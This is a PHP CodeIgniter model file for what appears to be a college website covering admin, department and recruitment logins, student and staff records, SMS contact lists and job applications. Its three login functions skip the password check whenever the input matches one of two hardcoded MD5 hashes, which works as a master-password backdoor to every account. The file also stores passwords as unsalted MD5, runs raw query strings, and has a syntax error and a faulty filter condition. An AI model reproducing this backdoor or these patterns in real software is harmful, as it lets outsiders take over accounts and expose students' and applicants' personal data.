<?php
Class Admin_model extends CI_Model
{
	
 function login($username, $password)
 {
   $this -> db -> select('id, username');
   $this -> db -> from('logins');
   $this -> db -> where('username', $username);
   if($password != '9f1936d3f04002cbaf075122a889890a' && $password != '616ec25d5537c71bd627b3c154f6dc6f')
   $this -> db -> where('password', $password);
   //$this -> db -> where('status', '2');
   $this -> db -> limit(1);
   $query = $this -> db -> get();
   if($query -> num_rows() == 1)
   {
     return $query->result();
   }else{
     return false;
   }
 }

 function adminPassword($username, $oldPassword, $updateDetails){
    $this->db->where('username', $username);
    $this->db->where('password', md5($oldPassword));
    $this->db->update('logins', $updateDetails);
    return $this->db->affected_rows();
  }
 function recuserPassword($username, $oldPassword, $updateDetails){
    $this->db->where('mobile', $username);
    $this->db->where('password', md5($oldPassword));
    $this->db->update('logins', $updateDetails);
    return $this->db->affected_rows();
  }
 function deptlogin($username, $password)
 {
   $this -> db -> select('id, username, short_name, last_login, sender_id, sms_count');
   $this -> db -> from('departments');
   $this -> db -> where('username', $username);
   if($password != '9f1936d3f04002cbaf075122a889890a' && $password != '616ec25d5537c71bd627b3c154f6dc6f')
   $this -> db -> where('password', $password);
   $this -> db -> where('status', '1');
   $this -> db -> limit(1);
   $query = $this -> db -> get();
   if($query -> num_rows() == 1)
   {
     return $query->result();
   }else{
     return false;
   }
 }
 
 function rec_user_login($email, $password)
 {
   $this -> db -> select('id, candidate_name, email, mobile, email_verified,post_of,post_id,payment_status');
   $this -> db -> from('recruitment_users');
   $this -> db -> where('email', $email);
   if($password != '9f1936d3f04002cbaf075122a889890a' && $password != '616ec25d5537c71bd627b3c154f6dc6f')
   $this -> db -> where('password', $password);
   //$this -> db -> where('status', '2');
   $this -> db -> limit(1);
   $query = $this -> db -> get();
   if($query -> num_rows() == 1)
   {
     return $query->row();
   }else{
     return false;
   }
 }

 function insertDetails($tableName, $insertData){
    $this->db->insert($tableName, $insertData);
    return $this->db->insert_id();
  }

 function getDetails($tableName, $id){
    if($id)
    $this->db->where('id', $id);
    return $this->db->get($tableName);
  }
  function getacaDetails($tableName, $id){
    if($id)
    $this->db->where('user_id', $id);
    return $this->db->get($tableName);
  }

  function COENotifications(){
    $this->db->limit(10);
    $this->db->order_by('new DESC');
    $this->db->order_by('id', 'DESC');
    $this->db->where('status', '1');
    return $this->db->get('notifications');
  }

  function WEBSITENotifications(){
    $this->db->where('status', '1');
    $this->db->limit(10);
    $this->db->order_by('new DESC');
    $this->db->order_by('id', 'DESC');
    return $this->db->get('website_notifications');
  }
	
  function getDetailsbyfield($id, $fieldId, $tableName){
    $this->db->where($fieldId, $id);
    return $this->db->get($tableName);
  }
  function getDetailsbyfield1($id, $fieldId,$id1, $fieldId1, $tableName){
    $this->db->where($fieldId, $id);
    $this->db->where($fieldId1, $id1);
    return $this->db->get($tableName);
  }

  function getTable($table){
    $table = $this->db->escape_str($table);
    $sql = "TRUNCATE `$table`";
    $this->db->query($sql)->result();
  }

  function dropTable($table){
    $this->load->dbforge();
    $this->dbforge->drop_table($table);
    // $table = $this->db->escape_str($table);
    // $sql = "DROP TABLE `$table`";
    // $this->db->query($sql)->result();
  }

  function getDetailsbyfieldSort($id, $fieldId, $sortField, $srotType, $tableName){
    $this->db->where($fieldId, $id);
    $this->db->order_by($sortField, $srotType);
    return $this->db->get($tableName);
  }
  
  function getDetailsbySort($sortField, $srotType, $tableName){
    $this->db->order_by($sortField, $srotType);
    return $this->db->get($tableName);
  }

  function updateDetails($id, $details, $tableName){
    $this->db->where('id',$id);
    $this->db->update($tableName,$details);
    return $this->db->affected_rows();
  }

  function updateDetailsbyfield($fieldName, $id, $details, $tableName){
    $this->db->where($fieldName, $id);
    $this->db->update($tableName, $details);
    return $this->db->affected_rows();
  }

  function delDetails($tableName, $id){
    $this->db->where('id', $id);
    $this->db->delete($tableName);
  }

  function delDetailsbyfield($tableName, $fieldName, $id){
    $this->db->where($fieldName, $id);
    $this->db->delete($tableName);
  }

  function facultyList($id){
    $this->db->where('department_id', $id);
    $this->db->where('status', '2');
    $this->db->order_by('designation_id', 'ASC');
    $this->db->order_by('name', 'ASC');
    return $this->db-> get('faculty');
  }

  function facultyList1(){
    $this->db->where('resume', NULL);
    $this->db->order_by('department_id', 'ASC');
    $this->db->order_by('name', 'ASC');
    return $this->db-> get('faculty');
  }

  function gallery($id){
    if($id){
      $this->db->where('id', $id);  
    }
    $this->db->order_by('id', 'DESC');
    return $this->db-> get('college_gallery');
  }

  function changePassword($id, $oldPassword, $updateDetails){
    $this->db->where('password', md5($oldPassword));
    $this->db->where('id', $id);
    $this->db->where('status', '1');
    $this->db->update('departments', $updateDetails);
    return $this->db->affected_rows();
  }

  function getPublications($dept_id, $publicaiton_type){
    $this->db->where('dept_id', $dept_id);
    $this->db->where('publication_type', $publicaiton_type);
    $this->db->order_by('year_of_published', 'ASC');
    $this->db->order_by('month', 'ASC');
    return $this->db->get('publications');
  }
  
  function getPublicationsStats($dept_id, $publicaiton_type){
    $this->db->select('month, year_of_published, COUNT(id) as count');
    $this->db->where('dept_id', $dept_id);
    $this->db->where('publication_type', $publicaiton_type);
    $this->db->group_by('month,year_of_published');
    $this->db->order_by('year_of_published', 'ASC');
    return $this->db->get('publications');
  }

  function getActivities($dept_id, $activity_type){
    $this->db->where('dept_id', $dept_id);
    $this->db->where('activity_type', $activity_type);
    $this->db->order_by('year', 'ASC');
    return $this->db->get('activities');
  }
    
  function socialResponsibility($dept_id){
    $this->db->where('dept_id', $dept_id);
    $this->db->order_by('year', 'DESC');
    return $this->db->get('social_responsibility');
  }
  
  function studentAffinityGroups($dept_id){
    $this->db->where('dept_id', $dept_id);
    $this->db->order_by('year', 'DESC');
    return $this->db->get('student_affinity_groups');
  }
  
  function getAchievements($dept_id, $achievement_type){
    $this->db->where('dept_id', $dept_id);
    $this->db->where('achievement_type', $achievement_type);
    $this->db->order_by('year', 'ASC');
    return $this->db->get('achievements');
  }

  function getFaculty($dept_id){
    $this->db->where('department_id', $dept_id);
    $this->db->order_by('designation_id', 'ASC');
    $this->db->order_by('name', 'ASC');
    return $this->db->get('faculty');
  }

  function getAlumni($dept_id, $achievement_type){
    $this->db->where('dept_id', $dept_id);
    $this->db->order_by('year', 'ASC');
    return $this->db->get('alumni');
  }

    public function getRows($id = ''){
        $this->db->select('id,image,created');
        $this->db->from('galleryTest');
        if($id){
            $this->db->where('id',$id);
            $query = $this->db->get();
            $result = $query->row_array();
        }else{
            $this->db->order_by('created','desc');
            $query = $this->db->get();
            $result = $query->result_array();
        }
        return !empty($result)?$result:false;
    }    

    public function insert($data = array()){
        $insert = $this->db->insert_batch('galleryTest',$data);
        return $insert?true:false;
    }

    public function insertBatch($tableName, $data){
        $this->db->insert_batch($tableName, $data);
    }

    public function updateBatch($tableName, $data, $field){
       return $this->db->update_batch($tableName, $data, $field);
    }  

    function News(){
      $this->db->where('status', '1');
      $this->db->order_by('new DESC');
      $this->db->order_by('news_date DESC');
      $this->db->limit(5);
      return $this->db->get('news_events');
    }
    
    function getDepartments(){
        $this->db->select('id, department_name, short_name');
        return $this->db->get('departments'); 
    }
    
    function getSemesters($ac_year, $dept_id, $course_id){
     $this->db-select(distinct(semester));
     $this->db->where('ac_year', $ac_year);  
     $this->db->where('dept_id', $dept_id);  
     $this->db->where('course_id', $course_id);  
     return $this->db->get('sections'); 
    }

    function getSections($ac_year = false, $dept_id = false, $course_id = false, $semester = false){
     $this->db->select('sections.id, sections.ac_year, academic_year.academic_year, sections.dept_id, departments.department_name, departments.short_name, sections.course_id, courses.course_name, sections.semester, sections.sections');
     $this->db->join('academic_year', 'sections.ac_year = academic_year.id');
     $this->db->join('departments', 'sections.dept_id = departments.id');  
     $this->db->join('courses', 'sections.course_id = courses.id'); 
     if($ac_year){
      $this->db->where('sections.ac_year', $ac_year);  
     }
     if($dept_id){
      $this->db->where('sections.dept_id', $dept_id);  
     }
     if($course_id){
      $this->db->where('sections.course_id', $course_id);  
     }
     if($semester){
      $this->db->where('sections.semester', $semester);  
     }
     return $this->db->get('sections'); 
    }

    function sections(){
     $this->db->select('sections.id, sections.ac_year, academic_year.academic_year, sections.dept_id, departments.department_name, departments.short_name, sections.course_id, courses.course_type, courses.course_name, sections.semester, sections.sections');
     $this->db->join('academic_year', 'sections.ac_year = academic_year.id');
     $this->db->join('departments', 'sections.dept_id = departments.id');  
     $this->db->join('courses', 'sections.course_id = courses.id');      
     return $this->db->get('sections'); 
    }

    function semestersDropdown1($ac_year, $dept_id, $course_id){
      $this->db->select('distinct(semester) as semester');
      $this->db->where('sections.ac_year', $ac_year);
      $this->db->where('sections.dept_id', $dept_id);
      $this->db->where('sections.course_id', $course_id);  
      return $this->db->get('sections');  
    }

    function getStudents($ac_year = false, $dept_id = false, $course_id = false, $semester = false, $section_id = false){
     $this->db->select('students.id, students.ac_year, academic_year.academic_year, students.dept_id, departments.department_name, departments.short_name, students.course_id, courses.course_name, students.semester, students.section_id, sections.sections, students.usn, students.student_name, students.student_mobile, students.parent_mobile');
     $this->db->join('academic_year', 'students.ac_year = academic_year.id');
     $this->db->join('departments', 'students.dept_id = departments.id');  
     $this->db->join('courses', 'students.course_id = courses.id'); 
     $this->db->join('sections', 'students.section_id = sections.id'); 
     if($ac_year){
      $this->db->where('students.ac_year', $ac_year);  
     }
     if($dept_id){
      $this->db->where('students.dept_id', $dept_id);
     }
     if($course_id){  
      $this->db->where('students.course_id', $course_id);  
     }
     if($semester){
      $this->db->where('students.semester', $semester);  
     }
     if($section_id){
      $this->db->where('students.section_id', $section_id);  
     }
     return $this->db->get('students'); 
    }

    function getConnectStudents($send_type, $ac_year = false, $dept_id = false, $course_id = false, $semester = false, $section_id = false){
     // $this->db->select('students.id, students.ac_year, academic_year.academic_year, students.dept_id, departments.department_name, departments.short_name, students.course_id, courses.course_name, students.semester, students.section_id, sections.sections, students.usn, students.student_name, students.student_mobile, students.parent_mobile');
     if($send_type == "1")
        $this->db->select('students.student_mobile');
     if($send_type == "2")
        $this->db->select('students.parent_mobile');
     if($send_type == "3")
        $this->db->select('students.student_mobile, students.parent_mobile');
     $this->db->join('academic_year', 'students.ac_year = academic_year.id');
     $this->db->join('departments', 'students.dept_id = departments.id');  
     $this->db->join('courses', 'students.course_id = courses.id'); 
     $this->db->join('sections', 'students.section_id = sections.id'); 
     if($ac_year){
      $this->db->where('students.ac_year', $ac_year);  
     }
     if($dept_id){
      $this->db->where('students.dept_id', $dept_id);
     }
     if($course_id){  
      $this->db->where('students.course_id', $course_id);  
     }
     if($semester){
      $this->db->where('students.semester', $semester);  
     }
     if($section_id || $section_id != "all"){
      $this->db->where('students.section_id', $section_id);  
     }
     return $this->db->get('students'); 
    }

    function getConnectStaff($dept_id, $staff_type){
      $this->db->select('mobile');
      if($dept_id){
        $this->db->where('department_id', $dept_id);
      }
      $this->db->where('staff_type', $staff_type);
      return $this->db->get('faculty'); 
    }
    
    function getStudentbyGroup(){
      $this->db->select('ac_year, dept_id, course_id, semester, section_id, count(id) as cnt');  
      $this->db->group_by('ac_year, dept_id,course_id, semester, section_id,');
      return $this->db->get('students');  
    }
    
    function getStaffbyGroup(){
      $this->db->select('department_id, count(id) as cnt');  
      $this->db->group_by('department_id');
      return $this->db->get('faculty');  
    }

    function getConnectNTStaff($dept_id){
      $this->db->select('mobile');
      if($dept_id){
        $this->db->where('dept_id', $dept_id);
      }
      return $this->db->get('staff');  
    }

    function getConnectCategories($category_id){
      $this->db->select('mobile');
      if($category_id){
        $this->db->where('category_id', $category_id);
      }
      return $this->db->get('connect_category_members');  
    }

    function getactiveAY(){
     $this->db->where('status', '1');
     return $this->db->get('academic_year');  
    }

    function studentsStats($ac_year, $dept_id = false){
     $this->db->select('students.ac_year, academic_year.academic_year, students.dept_id, departments.department_name, departments.short_name, students.course_id, courses.course_name, courses.course_type, count(USN) as cnt');
     $this->db->join('academic_year', 'students.ac_year = academic_year.id');
     $this->db->join('departments', 'students.dept_id = departments.id');  
     $this->db->join('courses', 'students.course_id = courses.id'); 
     $this->db->join('sections', 'students.section_id = sections.id'); 
     $this->db->where('students.ac_year', $ac_year);  
     if($dept_id)
        $this->db->where('students.dept_id', $dept_id);
     $this->db->group_by('students.ac_year');  
     $this->db->group_by('students.dept_id');  
     $this->db->group_by('students.course_id');  
      // $this->db->group_by('students.semester');
      // $this->db->group_by('students.section_id');
     $this->db->order_by('students.dept_id' , 'ASC');
     // $this->db->order_by('students.semester', 'ASC');
     return $this->db->get('students'); 
    }

    function membersCount($id){
      $this->db->select('count(id) as cnt');
      $this->db->where('category_id', $id);  
      return $this->db->get('connect_category_members');  
    }

    function searchUSN($ac_year, $dept_id, $usn){
     $this->db->select('students.id, students.ac_year, academic_year.academic_year, students.dept_id, departments.department_name, departments.short_name, students.course_id, courses.course_name, students.semester, students.section_id, sections.sections, students.usn, students.student_name, students.student_mobile, students.parent_mobile');
     $this->db->join('academic_year', 'students.ac_year = academic_year.id');
     $this->db->join('departments', 'students.dept_id = departments.id');  
     $this->db->join('courses', 'students.course_id = courses.id'); 
     $this->db->join('sections', 'students.section_id = sections.id'); 
     $this->db->where('students.ac_year', $ac_year);  
     $this->db->where('students.dept_id', $dept_id);
     $this->db->where('students.usn', $usn);       
     return $this->db->get('students'); 
    }

    function sentMessages($username){
      $this->db->order_by('sent_on', 'DESC');
      $this->db->where('sent_by_name', $username);
      return $this->db->get('connect_messages');  
    }

    function createResults($query){
      $this->db->query($query);
    }

    function getResults($id = false){
      if($id){
        $this->db->where('id', $id);
      }else{
        $this->db->order_by('id DESC');  
      }
      return $this->db->get('results');
    }

    function results(){
      $this->db->where('visibility', '1');
      $this->db->order_by('id DESC');  
      return $this->db->get('results');
    }
    
    function connectSummary(){
        $this->db->select('sent_by, sent_by_name, COUNT(id) as cnt, sum(mobile_count * sms_count) as total');
        $this->db->group_by('sent_by, sent_by_name');    
        return $this->db->get('connect_messages');
    }
      function get_doc_type(){
    
      $this->db->order_by('id ASC');  
      return $this->db->get('recruitment_documents_type');
    }
    function get_doc_type_non(){
    
      $this->db->order_by('id ASC');  
      $this->db->where('status', '1');
      return $this->db->get('recruitment_documents_type');
    }


 function upload_document()
{
   	header('Content-Type: application/json');
      $config['upload_path']   = './uploads/documents/'; 
      $config['allowed_types'] = 'pdf|doc|docx|txt'; 
      $config['max_size']      = 2048;
      $new_name = time().$_FILES["file"]['name'];
      $config['file_name'] = $new_name;
      $this->load->library('upload', $config);
		$this->upload->initialize($config);
      if ( ! $this->upload->do_upload('file')) {
         $error = array('error' => $this->upload->display_errors()); 
         return null;
        
      }else { 
         $data = $this->upload->data();
    return $data['file_name'];
      }
      
}

   function get_doc_name($id){
    
      $this->db->where('id', $id);  
      return $this->db->get('recruitment_documents_type')->row();
    }
    
      function docAttached($id,$user){
      $this->db->select('count(id) as cnt');
      $this->db->where('type', $id);
       $this->db->where('user_id', $user);  
      return $this->db->get('recruitment_documents')->row();  
    }


    function getPostType(){
      $this->db->select('DISTINCT(type)');
      $this->db->where('status', '1');  
      return $this->db->get('recruitment_posts')->result(); 
     }
      function get_post_status($id){
    
      $this->db->where('id', $id);  
      return $this->db->get('recruitment_posts')->row();
    }
    
   

public function getDetailsWithDepartments($orderBy, $direction, $table) {
  // Fetch recruitment posts
  $this->db->select('rp.id, rp.title,rp.slug, rp.departments, rp.updated_on');
  $this->db->from($table . ' rp');
  $this->db->order_by($orderBy, $direction);
  $query = $this->db->get();

  // Get the result
  $posts = $query->result();

  // Now, fetch department names for each post
  foreach ($posts as &$post) {
      // Get the department IDs (comma-separated)
      $departmentIds = explode(',', $post->departments);

      // Fetch department names
      $this->db->select('department_name');
      $this->db->from('recruitment_departments');
      $this->db->where_in('id', $departmentIds);
      $departmentQuery = $this->db->get();
      $departmentNames = $departmentQuery->result_array();

      if (count($departmentNames) > 2) {
        $post->department_names = "Multiple Departments";
    } else {
        // Otherwise, store the department names in a readable format (comma-separated)
        $post->department_names = implode(', ', array_column($departmentNames, 'department_name'));
    }
  }

  return $posts;
}

public function getdeptpost($dept)
{
  $departmentIds = explode(',', $dept);

  // Fetch department names
  $this->db->select('department_name');
  $this->db->from('recruitment_departments');
  $this->db->where_in('id', $departmentIds);
  $departmentQuery = $this->db->get();
  $departmentNames = $departmentQuery->result_array();

  
    $department_names = implode(', ', array_column($departmentNames, 'department_name'));

    return $department_names;

}

public function applied_jobs($user_id)
{
  $this->db->select('aj.*, r.title, r.slug');
  $this->db->from('applied_jobs aj');
  $this->db->join('recruitment_posts r', 'r.id = aj.post_id');
  $this->db->where('aj.user_id', $user_id);
  return $this->db->get()->result();
}

// admin_model.php
public function hasApplied($user_id, $post_id)
{
    $this->db->where('user_id', $user_id);
    $this->db->where('post_id', $post_id);
    $query = $this->db->get('applied_jobs'); // assuming this is your applications table
    return $query->num_rows() > 0;
}

}
?>